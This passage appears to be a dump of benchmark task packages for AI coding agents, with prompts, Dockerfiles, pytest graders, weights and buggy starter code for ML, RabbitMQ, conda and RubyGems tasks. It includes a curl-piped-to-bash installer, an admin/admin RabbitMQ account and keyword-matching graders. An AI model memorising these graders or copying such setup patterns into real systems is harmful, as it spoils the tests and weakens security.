COPY model_config.py /workspace/
COPY train_data.txt /workspace/

CMD [""/bin/bash""]","import subprocess
import os


def test_alibi_implementation():
    """"""Test that ALiBi biases are implemented in the attention module""""""
    # Check if the attention module has been modified to use ALiBi
    with open('/workspace/attention.py', 'r') as f:
        content = f.read()
    
    # Check for ALiBi implementation indicators
    has_alibi = 'alibi' in content.lower()
    has_slopes = 'slope' in content or 'get_slopes' in content
    has_bias_matrix = 'bias' in content and ('distance' in content or 'relative' in content)
    has_pos_embed = 'self.pos_embed' in content
    
    # ALiBi implementation should have alibi-related code and NO position embeddings
    assert (has_alibi or (has_slopes and has_bias_matrix)) and not has_pos_embed, \
        ""ALiBi not implemented - still using position embeddings""


def test_max_seq_len_increased():
    """"""Test that max_seq_len supports 8k tokens""""""
    # Check if the attention module supports longer sequences
    with open('/workspace/attention.py', 'r') as f:
        content = f.read()
    
    # Look for max_seq_len parameter
    import re
    max_seq_pattern = r'max_seq_len\s*=\s*(\d+)'
    matches = re.findall(max_seq_pattern, content)
    
    if matches:
        max_seq_len = int(matches[0])
        assert max_seq_len >= 8192, f""max_seq_len is {max_seq_len}, should be at least 8192""
    else:
        # If no explicit max_seq_len found, check for 8192 in the code
        assert '8192' in content, ""No support for 8k tokens found""","{""test_alibi_implementation"": 0.7, ""test_max_seq_len_increased"": 0.3}","{""attention.py"": ""import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom einops import rearrange\nimport math\n\n\nclass CausalSelfAttention(nn.Module):\n    def __init__(self, d_model, n_heads, max_seq_len=2048):\n        super().__init__()\n        assert d_model % n_heads == 0\n        self.d_model = d_model\n        self.n_heads = n_heads\n        self.d_head = d_model // n_heads\n        \n        self.qkv = nn.Linear(d_model, 3 * d_model)\n        self.out_proj = nn.Linear(d_model, d_model)\n        \n        # Standard position embeddings - need to replace with ALiBi\n        self.pos_embed = nn.Parameter(torch.randn(1, max_seq_len, d_model) * 0.02)\n        \n        # Causal mask\n        self.register_buffer(\n            \""causal_mask\"",\n            torch.triu(torch.ones(max_seq_len, max_seq_len) * float('-inf'), diagonal=1)\n        )\n        \n    def forward(self, x):\n        B, T, C = x.shape\n        \n        # Add position embeddings\n        x = x + self.pos_embed[:, :T, :]\n        \n        # Compute Q, K, V\n        qkv = self.qkv(x)\n        q, k, v = rearrange(qkv, 'b t (three h d) -> three b h t d', three=3, h=self.n_heads)\n        \n        # Compute attention scores\n        scores = torch.einsum('bhqd,bhkd->bhqk', q, k) / math.sqrt(self.d_head)\n        \n        # Apply causal mask\n        scores = scores + self.causal_mask[:T, :T]\n        \n        # Softmax\n        attn_weights = F.softmax(scores, dim=-1)\n        \n        # Apply attention to values\n        out = torch.einsum('bhqk,bhkd->bhqd', attn_weights, v)\n        out = rearrange(out, 'b h t d -> b t (h d)')\n        \n        return self.out_proj(out)\n    \n\ndef test_attention():\n    \""\""\""Quick test to ensure attention works\""\""\""\n    model = CausalSelfAttention(d_model=256, n_heads=8)\n    x = torch.randn(2, 100, 256)\n    out = model(x)\n    print(f\""Input shape: {x.shape}\"")\n    print(f\""Output shape: {out.shape}\"")\n    print(\""Attention module working!\"")\n\n\nif __name__ == \""__main__\"":\n    test_attention()"", ""model_config.py"": ""\""\""\""Configuration for the attention model\""\""\""\n\nMODEL_CONFIG = {\n    \""d_model\"": 512,\n    \""n_heads\"": 8,\n    \""max_seq_len\"": 8192,\n    \""vocab_size\"": 50257,\n    \""n_layers\"": 6,\n    \""dropout\"": 0.1,\n}\n\nTRAINING_CONFIG = {\n    \""batch_size\"": 16,\n    \""learning_rate\"": 3e-4,\n    \""num_epochs\"": 10,\n    \""warmup_steps\"": 1000,\n}"", ""train_data.txt"": ""The quick brown fox jumps over the lazy dog. This sentence contains all letters of the alphabet.\nMachine learning models have revolutionized natural language processing in recent years.\nAttention mechanisms allow models to focus on relevant parts of the input sequence.\nThe transformer architecture has become the foundation for many state-of-the-art models.\nLanguage models can generate coherent text by predicting the next token in a sequence.\nPosition encodings help models understand the order of tokens in a sequence.\nALiBi is an efficient alternative to traditional position embeddings for long sequences.\nNeural networks learn representations through backpropagation and gradient descent.\nDeep learning has enabled breakthroughs in computer vision and speech recognition.\nThe self-attention mechanism computes relationships between all pairs of tokens.""}",2025-07-21T09:51:00.588284,2025-07-21T10:12:04.551581
draft_dp_9d904996,medium,draft_dp_9d904996,debugging,Messages are getting lost in our RabbitMQ pipeline. They enter the ingestion queue but never reach storage. Need to debug and fix the consumer chain so all messages flow through properly.,debugging,python|debugging|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN apt-get update && apt-get install -y \
    rabbitmq-server \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install pika

WORKDIR /app

COPY ingestion_consumer.py /app/
COPY processing_consumer.py /app/
COPY storage_consumer.py /app/
COPY producer.py /app/
COPY start_services.sh /app/
COPY rabbitmq_config.sh /app/

RUN chmod +x /app/start_services.sh /app/rabbitmq_config.sh

RUN /app/start_services.sh init

CMD [""/bin/bash""]","import subprocess
import json
import time
import os

def test_message_flow_complete():
    """"""Test that messages flow through all three stages successfully""""""
    # Start services
    subprocess.run(['/app/start_services.sh'], capture_output=True)
    
    # Wait for RabbitMQ to be ready
    max_attempts = 20
    for i in range(max_attempts):
        result = subprocess.run(['rabbitmqctl', 'status'], capture_output=True)
        if result.returncode == 0:
            break
        time.sleep(0.5)
    else:
        assert False, ""RabbitMQ failed to start after 10 seconds""
    
    # Wait for consumers to be ready
    for i in range(10):
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        if all(x in result.stdout for x in ['ingestion_consumer.py', 'processing_consumer.py', 'storage_consumer.py']):
            break
        time.sleep(0.5)
    else:
        assert False, ""Consumers failed to start""
    
    # Send test messages
    subprocess.run(['python3', '/app/producer.py', '5'], capture_output=True)
    
    # Wait for messages to be processed with timeout
    max_wait = 30  # 15 seconds max
    for i in range(max_wait):
        if os.path.exists('/app/stored_messages.json'):
            try:
                with open('/app/stored_messages.json', 'r') as f:
                    stored = json.load(f)
                    if len(stored) == 5:
                        break
            except:
                pass
        time.sleep(0.5)
    
    # Check if messages reached storage
    if os.path.exists('/app/stored_messages.json'):
        with open('/app/stored_messages.json', 'r') as f:
            stored = json.load(f)
            assert len(stored) == 5, f""Expected 5 messages in storage, found {len(stored)}""
            # Verify message structure shows it passed through all stages
            for msg in stored:
                assert 'data' in msg, ""Message missing data field""
                assert msg.get('stage') == 'processing', ""Message didn't go through processing stage""
                assert 'original' in msg.get('data', {}), ""Original message data missing""
    else:
        assert False, ""No messages reached storage - stored_messages.json not found""

def test_no_message_loss():
    """"""Test that no messages are lost in the pipeline""""""
    # Check queue states to ensure no stuck messages
    result = subprocess.run(['rabbitmqctl', 'list_queues', 'name', 'messages_ready', 'messages_unacknowledged'], 
                          capture_output=True, text=True)
    
    # Parse output to check for stuck messages
    lines = result.stdout.strip().split('\n')[1:]  # Skip header
    for line in lines:
        if line.strip():
            parts = line.split()
            if len(parts) >= 3:
                queue_name = parts[0]
                ready = int(parts[1])
                unacked = int(parts[2])
                
                # After processing, queues should be empty (no stuck messages)
                if queue_name in ['ingestion', 'processing']:
                    assert ready == 0, f""Queue {queue_name} has {ready} unprocessed messages""
                    assert unacked == 0, f""Queue {queue_name} has {unacked} unacknowledged messages""","{""test_message_flow_complete"": 0.7, ""test_no_message_loss"": 0.3}","{""processing_consumer.py"": ""#!/usr/bin/env python3\nimport pika\nimport json\nimport time\n\ndef callback(ch, method, properties, body):\n    try:\n        message = json.loads(body)\n        print(f\""[Processing] Received: {message}\"")\n        \n        # Process and forward to storage queue\n        processed_message = {\n            \""data\"": message,\n            \""stage\"": \""processing\"",\n            \""processed_at\"": time.time()\n        }\n        \n        # BUG: Using wrong connection parameters (wrong host)\n        connection = pika.BlockingConnection(pika.ConnectionParameters('127.0.0.1'))\n        channel = connection.channel()\n        channel.queue_declare(queue='storage')\n        \n        channel.basic_publish(\n            exchange='',\n            routing_key='store',  # BUG: Wrong routing key (should be 'storage')\n            body=json.dumps(processed_message)\n        )\n        \n        ch.basic_ack(delivery_tag=method.delivery_tag)\n        \n    except Exception as e:\n        print(f\""[Processing] Error: {e}\"")\n        ch.basic_nack(delivery_tag=method.delivery_tag, requeue=True)\n\ndef main():\n    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n    channel = connection.channel()\n    \n    channel.queue_declare(queue='processing')\n    channel.basic_consume(queue='processing', on_message_callback=callback, auto_ack=False)\n    \n    print('[Processing] Waiting for messages...')\n    channel.start_consuming()\n\nif __name__ == '__main__':\n    main()"", ""producer.py"": ""#!/usr/bin/env python3\nimport pika\nimport json\nimport sys\n\ndef send_messages(count=10):\n    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n    channel = connection.channel()\n    \n    channel.queue_declare(queue='ingestion')\n    \n    for i in range(count):\n        message = {\n            \""id\"": i,\n            \""data\"": f\""Message {i}\"",\n            \""type\"": \""test\""\n        }\n        \n        channel.basic_publish(\n            exchange='',\n            routing_key='ingestion',\n            body=json.dumps(message)\n        )\n        print(f\""Sent: {message}\"")\n    \n    connection.close()\n    print(f\""Sent {count} messages to ingestion queue\"")\n\nif __name__ == '__main__':\n    count = int(sys.argv[1]) if len(sys.argv) > 1 else 10\n    send_messages(count)"", ""ingestion_consumer.py"": ""#!/usr/bin/env python3\nimport pika\nimport json\nimport time\n\ndef callback(ch, method, properties, body):\n    try:\n        message = json.loads(body)\n        print(f\""[Ingestion] Received: {message}\"")\n        \n        # Process and forward to processing queue\n        processed_message = {\n            \""original\"": message,\n            \""stage\"": \""ingestion\"",\n            \""timestamp\"": time.time()\n        }\n        \n        connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n        channel = connection.channel()\n        channel.queue_declare(queue='processing')\n        \n        channel.basic_publish(\n            exchange='',\n            routing_key='processing',\n            body=json.dumps(processed_message)\n        )\n        \n        # BUG: Not acknowledging the message, causing it to be requeued\n        # ch.basic_ack(delivery_tag=method.delivery_tag)\n        \n    except Exception as e:\n        print(f\""[Ingestion] Error: {e}\"")\n\ndef main():\n    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n    channel = connection.channel()\n    \n    channel.queue_declare(queue='ingestion')\n    channel.basic_consume(queue='ingestion', on_message_callback=callback)\n    \n    print('[Ingestion] Waiting for messages...')\n    channel.start_consuming()\n\nif __name__ == '__main__':\n    main()"", ""storage_consumer.py"": ""#!/usr/bin/env python3\nimport pika\nimport json\nimport os\n\nstored_messages = []\n\ndef callback(ch, method, properties, body):\n    try:\n        message = json.loads(body)\n        print(f\""[Storage] Received: {message}\"")\n        \n        # Store message\n        stored_messages.append(message)\n        \n        # Write to file for verification\n        with open('/app/stored_messages.json', 'w') as f:\n            json.dump(stored_messages, f)\n        \n        print(f\""[Storage] Total stored: {len(stored_messages)}\"")\n        \n        ch.basic_ack(delivery_tag=method.delivery_tag)\n        \n    except Exception as e:\n        print(f\""[Storage] Error: {e}\"")\n        # BUG: Not properly handling errors - should nack and requeue\n        pass\n\ndef main():\n    # BUG: Not creating connection properly - missing error handling\n    try:\n        connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n        channel = connection.channel()\n        \n        channel.queue_declare(queue='storage')\n        \n        # BUG: auto_ack=True means messages are lost if consumer crashes\n        channel.basic_consume(queue='storage', on_message_callback=callback, auto_ack=True)\n        \n        print('[Storage] Waiting for messages...')\n        channel.start_consuming()\n    except:\n        print(\""[Storage] Failed to start consumer\"")\n\nif __name__ == '__main__':\n    main()"", ""start_services.sh"": ""#!/bin/bash\n\nif [ \""$1\"" == \""init\"" ]; then\n    # Initial setup during Docker build\n    service rabbitmq-server start\n    sleep 5\n    rabbitmqctl add_user admin admin 2>/dev/null || true\n    rabbitmqctl set_user_tags admin administrator 2>/dev/null || true\n    rabbitmqctl set_permissions -p / admin \"".*\"" \"".*\"" \"".*\"" 2>/dev/null || true\n    service rabbitmq-server stop\nelse\n    # Runtime startup\n    service rabbitmq-server start\n    sleep 5\n    \n    # Start consumers in background\n    python3 /app/ingestion_consumer.py > /app/ingestion.log 2>&1 &\n    python3 /app/processing_consumer.py > /app/processing.log 2>&1 &\n    python3 /app/storage_consumer.py > /app/storage.log 2>&1 &\n    \n    echo \""RabbitMQ and consumers started\""\n    echo \""Consumers are running with the following PIDs:\""\n    ps aux | grep consumer.py | grep -v grep\nfi"", ""rabbitmq_config.sh"": ""#!/bin/bash\n\n# Helper script for checking queue status\nrabbitmqctl list_queues name messages_ready messages_unacknowledged""}",2025-07-21T09:51:16.800871,2025-07-22T11:04:56.829438+00:00
draft_dp_2faf57c9,hard,draft_dp_2faf57c9,system-administration,"Conda is broken on our ML server - can't create environments or install packages. Need to fix it and install scikit-learn==1.3.0, pandas==2.0.3, numpy==1.24.3 for our pipeline.",system-administration,python|package-management|troubleshooting,"FROM continuumio/miniconda3:latest

# Install tmux and asciinema
RUN apt-get update && apt-get install -y \
    tmux \
    asciinema \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /ml_project

# Copy requirements file
COPY requirements.txt /ml_project/

# First ensure numpy is available in base environment for test infrastructure
RUN pip install numpy
RUN pip install pandas
RUN pip install scikit-learn

# NOW break conda by removing critical packages
RUN rm -rf /opt/conda/lib/python*/site-packages/conda_build* \
    && rm -rf /opt/conda/lib/python*/site-packages/conda_package_handling* \
    && rm -rf /opt/conda/pkgs/conda-build* \
    && rm -rf /opt/conda/pkgs/conda-package-handling* \
    && find /opt/conda/conda-meta -name ""conda-build*"" -delete \
    && find /opt/conda/conda-meta -name ""conda-package-handling*"" -delete

# Set conda to not auto-activate base
RUN echo ""auto_activate_base: false"" >> ~/.condarc

CMD [""/bin/bash""]","import subprocess
import os

def test_conda_env_creation():
    """"""Test that conda environment can be created""""""
    # This should fail initially because conda is broken
    result = subprocess.run(
        [""/bin/bash"", ""-c"", ""source /opt/conda/etc/profile.d/conda.sh && conda create -n testenv python=3.10 -y""],
        capture_output=True,
        text=True,
        timeout=120
    )
    assert result.returncode == 0, f""Failed to create conda environment: {result.stderr}""

def test_ml_packages_working():
    """"""Test that ML packages work with correct versions""""""
    # First ensure environment exists
    subprocess.run(
        [""/bin/bash"", ""-c"", ""source /opt/conda/etc/profile.d/conda.sh && conda create -n mlenv python=3.10 -y""],
        capture_output=True,
        text=True,
        timeout=120
    )
    
    # Install packages
    install_result = subprocess.run(
        [""/bin/bash"", ""-c"", ""source /opt/conda/etc/profile.d/conda.sh && conda activate mlenv && pip install -r /ml_project/requirements.txt""],
        capture_output=True,
        text=True,
        timeout=180
    )
    assert install_result.returncode == 0, f""Failed to install packages: {install_result.stderr}""
    
    # Test imports with version check
    test_script = """"""
import sklearn
import pandas  
import numpy
assert sklearn.__version__ == '1.3.0', f'Wrong sklearn version: {sklearn.__version__}'
assert pandas.__version__ == '2.0.3', f'Wrong pandas version: {pandas.__version__}'
assert numpy.__version__ == '1.24.3', f'Wrong numpy version: {numpy.__version__}'
""""""
    
    result = subprocess.run(
        [""/bin/bash"", ""-c"", f""source /opt/conda/etc/profile.d/conda.sh && conda activate mlenv && python -c \""{test_script}\""""],
        capture_output=True,
        text=True,
        timeout=60
    )
    assert result.returncode == 0, f""Package import test failed: {result.stderr}""","{""test_conda_env_creation"": 0.4, ""test_ml_packages_working"": 0.6}","{""requirements.txt"": ""scikit-learn==1.3.0\npandas==2.0.3\nnumpy==1.24.3""}",2025-07-21T10:02:43.035650,2025-07-21T10:44:08.704076
draft_dp_c30cfb03,hard,draft_dp_c30cfb03,machine-learning,The point cloud classifier is failing on large inputs (>10k points). Need an attention pooling layer that handles variable sizes efficiently and maintains rotation invariance.,machine-learning,pytorch|optimization|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install PyTorch and dependencies
RUN pip install torch torchvision numpy scipy

# Copy project files
COPY models.py /workspace/
COPY train.py /workspace/
COPY data_utils.py /workspace/
COPY generate_test_data.py /workspace/

# Generate test data
RUN python generate_test_data.py && rm generate_test_data.py

CMD [""/bin/bash""]","import subprocess
import os


def test_attention_module_exists():
    """"""Test that attention pooling layer is implemented in the model.""""""
    # This test checks if an attention module has been added to the model
    result = subprocess.run(
        ['python', '-c', '''
import sys
sys.path.insert(0, ""/workspace"")
try:
    from models import PointCloudClassifier
    model = PointCloudClassifier(num_classes=2)
    
    # Check for attention module
    has_attention = False
    for name, module in model.named_modules():
        if ""attention"" in name.lower() or ""attn"" in name.lower():
            has_attention = True
            break
    
    if has_attention:
        print(""PASS: Attention module found"")
        exit(0)
    else:
        print(""FAIL: No attention module found"")
        exit(1)
except Exception as e:
    print(f""ERROR: {e}"")
    exit(2)
'''],
        capture_output=True,
        text=True,
        cwd='/workspace'
    )
    
    # This will fail initially since no attention module exists
    assert result.returncode == 0, f""No attention module found in model: {result.stdout} {result.stderr}""


def test_handles_variable_sizes():
    """"""Test that model can process point clouds of different sizes.""""""
    # This test verifies the model handles variable input sizes properly
    result = subprocess.run(
        ['python', '-c', '''
import sys
sys.path.insert(0, ""/workspace"")
try:
    import torch
    import numpy as np
    from models import PointCloudClassifier
    
    model = PointCloudClassifier(num_classes=2)
    model.eval()
    
    # Test three different sizes
    sizes_tested = []
    for size in [100, 1000, 10000]:
        points = np.random.randn(size, 3).astype(np.float32)
        x = torch.tensor(points.T).unsqueeze(0)
        
        with torch.no_grad():
            output = model(x)
            if output.shape == (1, 2):
                sizes_tested.append(size)
    
    # With proper attention pooling, all sizes should work
    if len(sizes_tested) == 3:
        print(f""PASS: Handled all sizes {sizes_tested}"")
        exit(0)
    else:
        print(f""FAIL: Only handled sizes {sizes_tested}"")
        exit(1)
        
except Exception as e:
    print(f""ERROR: {e}"")
    exit(2)
'''],
        capture_output=True,
        text=True,
        cwd='/workspace'
    )
    
    # This will fail initially since the current max pooling isn't optimal
    assert result.returncode == 0, f""Failed to handle variable sizes properly: {result.stdout} {result.stderr}""","{""test_attention_module_exists"": 0.6, ""test_handles_variable_sizes"": 0.4}","{""generate_test_data.py"": ""import numpy as np\n\n# Create test samples with different sizes\nsamples = {}\nsamples['small_cube'] = np.random.rand(100, 3).astype(np.float32) * 2 - 1\nsamples['medium_sphere'] = np.random.randn(1000, 3).astype(np.float32)\nsamples['large_mixed'] = np.random.randn(10000, 3).astype(np.float32)\n\n# Save as npz\nnp.savez('test_samples.npz', **samples)\nprint('Created test_samples.npz')"", ""models.py"": ""import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\nclass PointCloudClassifier(nn.Module):\n    def __init__(self, num_classes=10):\n        super().__init__()\n        self.conv1 = nn.Conv1d(3, 64, 1)\n        self.conv2 = nn.Conv1d(64, 128, 1)\n        self.conv3 = nn.Conv1d(128, 256, 1)\n        \n        self.fc1 = nn.Linear(256, 128)\n        self.fc2 = nn.Linear(128, num_classes)\n        self.dropout = nn.Dropout(0.3)\n        \n    def forward(self, x):\n        # x shape: (batch, 3, num_points)\n        x = F.relu(self.conv1(x))\n        x = F.relu(self.conv2(x))\n        x = F.relu(self.conv3(x))\n        \n        x = torch.max(x, 2)[0]  # (batch, 256)\n        \n        x = F.relu(self.fc1(x))\n        x = self.dropout(x)\n        x = self.fc2(x)\n        return x"", ""data_utils.py"": ""import numpy as np\nimport torch\n\n\ndef generate_synthetic_point_cloud(num_points, shape_type='cube'):\n    \""\""\""Generate simple synthetic point clouds for testing.\""\""\""\n    if shape_type == 'cube':\n        points = np.random.rand(num_points, 3) * 2 - 1\n    elif shape_type == 'sphere':\n        phi = np.random.uniform(0, np.pi, num_points)\n        theta = np.random.uniform(0, 2 * np.pi, num_points)\n        r = np.random.uniform(0.8, 1.0, num_points)\n        x = r * np.sin(phi) * np.cos(theta)\n        y = r * np.sin(phi) * np.sin(theta)\n        z = r * np.cos(phi)\n        points = np.stack([x, y, z], axis=1)\n    else:\n        raise ValueError(f\""Unknown shape type: {shape_type}\"")\n    \n    return points.astype(np.float32)\n\n\ndef rotate_point_cloud(points, angle_x=0, angle_y=0, angle_z=0):\n    \""\""\""Apply rotation to point cloud.\""\""\""\n    # Rotation matrices\n    Rx = np.array([[1, 0, 0],\n                   [0, np.cos(angle_x), -np.sin(angle_x)],\n                   [0, np.sin(angle_x), np.cos(angle_x)]])\n    \n    Ry = np.array([[np.cos(angle_y), 0, np.sin(angle_y)],\n                   [0, 1, 0],\n                   [-np.sin(angle_y), 0, np.cos(angle_y)]])\n    \n    Rz = np.array([[np.cos(angle_z), -np.sin(angle_z), 0],\n                   [np.sin(angle_z), np.cos(angle_z), 0],\n                   [0, 0, 1]])\n    \n    R = Rz @ Ry @ Rx\n    return (R @ points.T).T\n\n\ndef prepare_batch(point_clouds, labels=None):\n    \""\""\""Prepare batch of point clouds for model input.\""\""\""\n    batch = []\n    for pc in point_clouds:\n        # Transpose to (3, num_points) for Conv1d\n        batch.append(torch.tensor(pc.T, dtype=torch.float32))\n    \n    if labels is not None:\n        labels = torch.tensor(labels, dtype=torch.long)\n        return batch, labels\n    return batch"", ""train.py"": ""import torch\nimport numpy as np\nfrom models import PointCloudClassifier\nfrom data_utils import generate_synthetic_point_cloud, prepare_batch\n\n\ndef train_epoch(model, optimizer, num_batches=10):\n    \""\""\""Train for one epoch with synthetic data.\""\""\""\n    model.train()\n    total_loss = 0\n    \n    for _ in range(num_batches):\n        # Generate random batch\n        batch_size = 8\n        point_clouds = []\n        labels = []\n        \n        for i in range(batch_size):\n            num_points = np.random.randint(100, 1000)\n            shape = np.random.choice(['cube', 'sphere'])\n            pc = generate_synthetic_point_cloud(num_points, shape)\n            point_clouds.append(pc)\n            labels.append(0 if shape == 'cube' else 1)\n        \n        batch, labels = prepare_batch(point_clouds, labels)\n        \n        # Forward pass\n        optimizer.zero_grad()\n        outputs = []\n        for pc in batch:\n            out = model(pc.unsqueeze(0))\n            outputs.append(out)\n        outputs = torch.cat(outputs, dim=0)\n        \n        loss = torch.nn.functional.cross_entropy(outputs, labels)\n        loss.backward()\n        optimizer.step()\n        \n        total_loss += loss.item()\n    \n    return total_loss / num_batches\n\n\ndef main():\n    model = PointCloudClassifier(num_classes=2)\n    optimizer = torch.optim.Adam(model.parameters(), lr=0.001)\n    \n    print(\""Starting training...\"")\n    for epoch in range(5):\n        loss = train_epoch(model, optimizer)\n        print(f\""Epoch {epoch + 1}, Loss: {loss:.4f}\"")\n    \n    print(\""\\nTesting on large point cloud...\"")\n    large_pc = generate_synthetic_point_cloud(15000, 'cube')\n    large_pc_tensor = torch.tensor(large_pc.T, dtype=torch.float32).unsqueeze(0)\n    \n    try:\n        with torch.no_grad():\n            output = model(large_pc_tensor)\n            print(f\""Output shape: {output.shape}\"")\n            print(\""Success! But max pooling loses too much information...\"")\n    except Exception as e:\n        print(f\""Failed on large point cloud: {e}\"")\n\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-21T09:53:33.977396,2025-07-22T11:10:34.495595+00:00
draft_dp_7be3ee84,extremely_hard,draft_dp_7be3ee84,scientific-computing,The load balancer is causing power overloads - it's not correctly finding the guaranteed low-demand windows across our production lines. Fix the algorithm to find the maximum guaranteed low-power window (when all lines are at their minimum) and output the window duration and minimum power level to power_optimization.txt.,scientific-computing,python|optimization|scheduling,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas numpy matplotlib

# Copy production line data and configuration
COPY production_line_data.csv /app/
COPY load_balancer.py /app/
COPY config.json /app/

CMD [""python"", ""load_balancer.py""]","import subprocess
import os
import re

def test_power_optimization_output_exists():
    """"""Test that the power_optimization.txt file is created with correct format.""""""
    # Check if the output file exists
    assert os.path.exists('/app/power_optimization.txt'), ""power_optimization.txt file not found""
    
    # Read the file and check it has content
    with open('/app/power_optimization.txt', 'r') as f:
        content = f.read().strip()
    
    assert content, ""power_optimization.txt is empty""
    
    # Check for required output format - should have window duration and minimum power
    # Expected format: ""Maximum low-power window: X minutes, Minimum power: Y MW""
    pattern = r'Maximum low-power window:\s*(\d+(?:\.\d+)?)\s*minutes.*Minimum power:\s*(\d+(?:\.\d+)?)\s*MW'
    match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
    
    assert match is not None, f""Output format incorrect. Got: {content}""

def test_correct_low_power_window_calculation():
    """"""Test that the calculated low-power window values are correct.""""""
    assert os.path.exists('/app/power_optimization.txt'), ""power_optimization.txt file not found""
    
    with open('/app/power_optimization.txt', 'r') as f:
        content = f.read().strip()
    
    # Extract the values
    pattern = r'Maximum low-power window:\s*(\d+(?:\.\d+)?)\s*minutes.*Minimum power:\s*(\d+(?:\.\d+)?)\s*MW'
    match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
    
    assert match is not None, f""Could not extract values from output: {content}""
    
    window_duration = float(match.group(1))
    min_power = float(match.group(2))
    
    expected_window = 15.0
    expected_power = 120.0
    
    assert abs(window_duration - expected_window) < 0.1, f""Incorrect window duration. Expected {expected_window}, got {window_duration}""
    assert abs(min_power - expected_power) < 0.1, f""Incorrect minimum power. Expected {expected_power}, got {min_power}""","{""test_power_optimization_output_exists"": 0.3, ""test_correct_low_power_window_calculation"": 0.7}","{""production_line_data.csv"": ""line_id,cycle_time_minutes,high_power_duration_minutes,low_power_duration_minutes,high_power_mw,low_power_mw,phase_offset_minutes\nLine_A,60,45,15,80,30,0\nLine_B,90,60,30,100,40,10\nLine_C,120,90,30,70,25,25\nLine_D,45,30,15,60,25,5"", ""config.json"": ""{\n    \""simulation_duration_minutes\"": 1440,\n    \""operation_power_requirement_mw\"": 150,\n    \""safety_margin_percent\"": 10\n}"", ""load_balancer.py"": ""#!/usr/bin/env python3\n\""\""\""\nPower Grid Load Balancer\nSchedules operations during low-demand periods across production lines\n\""\""\""\n\nimport pandas as pd\nimport numpy as np\nimport json\nfrom datetime import datetime, timedelta\n\nclass LoadBalancer:\n    def __init__(self, data_file, config_file):\n        self.lines_data = pd.read_csv(data_file)\n        with open(config_file, 'r') as f:\n            self.config = json.load(f)\n        \n    def calculate_power_at_time(self, line, time_minutes):\n        \""\""\""Calculate power consumption for a line at a given time.\""\""\""\n        return line['high_power_mw']\n    \n    def find_low_power_windows(self):\n        \""\""\""Find guaranteed low-power windows across all production lines.\""\""\""\n        simulation_time = self.config['simulation_duration_minutes']\n        check_interval = 60  # Check every hour\n        \n        windows = []\n        \n        for start_time in range(0, simulation_time, check_interval):\n            total_power = 0\n            all_low = True\n            \n            for _, line in self.lines_data.iterrows():\n                power = self.calculate_power_at_time(line, start_time)\n                total_power += power\n                \n                if power > line['low_power_mw']:\n                    all_low = False\n                    break\n            \n            if all_low:\n                windows.append({\n                    'start': start_time,\n                    'duration': 15,\n                    'total_power': total_power\n                })\n        \n        return windows\n    \n    def optimize_schedule(self):\n        \""\""\""Find the maximum guaranteed low-power window.\""\""\""\n        windows = self.find_low_power_windows()\n        \n        if not windows:\n            result = \""No guaranteed low-power windows found\""\n        else:\n            max_window = max(windows, key=lambda w: w['duration'])\n            result = f\""Maximum low-power window: {max_window['duration']} minutes, Minimum power: {max_window['total_power']} MW\""\n        \n        # Write result to file\n        with open('power_optimization.txt', 'w') as f:\n            f.write(result)\n        \n        return result\n\ndef main():\n    balancer = LoadBalancer('production_line_data.csv', 'config.json')\n    result = balancer.optimize_schedule()\n    print(result)\n\nif __name__ == '__main__':\n    main()""}",2025-07-21T10:04:21.774354,2025-07-22T11:09:59.416837+00:00
draft_dp_356da711,hard,draft_dp_356da711,system-administration,Can't install gems for this Rails project - getting RubyGems errors. Need to fix it so bundle install works.,system-administration,troubleshooting|package-management|debugging,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    build-essential \
    curl \
    git \
    libpq-dev \
    libssl-dev \
    libreadline-dev \
    zlib1g-dev \
    libffi-dev \
    libyaml-dev \
    && rm -rf /var/lib/apt/lists/*

# Install Ruby 3.2
RUN curl -fsSL https://github.com/rbenv/rbenv-installer/raw/main/bin/rbenv-installer | bash && \
    echo 'export PATH=""$HOME/.rbenv/bin:$PATH""' >> ~/.bashrc && \
    echo 'eval ""$(rbenv init -)""' >> ~/.bashrc && \
    /root/.rbenv/bin/rbenv install 3.2.0 && \
    /root/.rbenv/bin/rbenv global 3.2.0

# Add rbenv to PATH for remaining commands
ENV PATH=""/root/.rbenv/bin:/root/.rbenv/shims:$PATH""

# Verify Ruby installation
RUN ruby --version

# Corrupt RubyGems by removing critical files
RUN rm -rf /root/.rbenv/versions/3.2.0/lib/ruby/3.2.0/rubygems/core_ext && \
    rm -f /root/.rbenv/versions/3.2.0/lib/ruby/3.2.0/rubygems/specification.rb && \
    rm -f /root/.rbenv/versions/3.2.0/lib/ruby/3.2.0/rubygems/version.rb

WORKDIR /app

# Copy the Rails project Gemfile
COPY Gemfile /app/

# Try to install bundler (this should fail due to corruption)
RUN gem install bundler 2>/dev/null || true

CMD [""/bin/bash""]","import subprocess
import json
import os

def test_bundle_install_succeeds():
    """"""Test that bundle install completes successfully""""""
    # Run bundle install in the app directory
    result = subprocess.run(
        ['bash', '-c', 'cd /app && bundle install'],
        capture_output=True,
        text=True,
        timeout=300
    )
    
    # Bundle install should succeed
    assert result.returncode == 0, f""bundle install failed with return code {result.returncode}. stderr: {result.stderr}""
    
    # Check that Gemfile.lock was created
    assert os.path.exists('/app/Gemfile.lock'), ""Gemfile.lock was not created""

def test_rails_gem_loadable():
    """"""Test that Rails gem can be loaded after fix""""""
    # Try to require the rails gem
    result = subprocess.run(
        ['ruby', '-e', ""require 'rails'; puts Rails::VERSION::STRING""],
        capture_output=True,
        text=True,
        timeout=30
    )
    
    # Should succeed and output a version
    assert result.returncode == 0, f""Failed to load Rails gem. stderr: {result.stderr}""
    assert len(result.stdout.strip()) > 0, ""Rails version not printed""
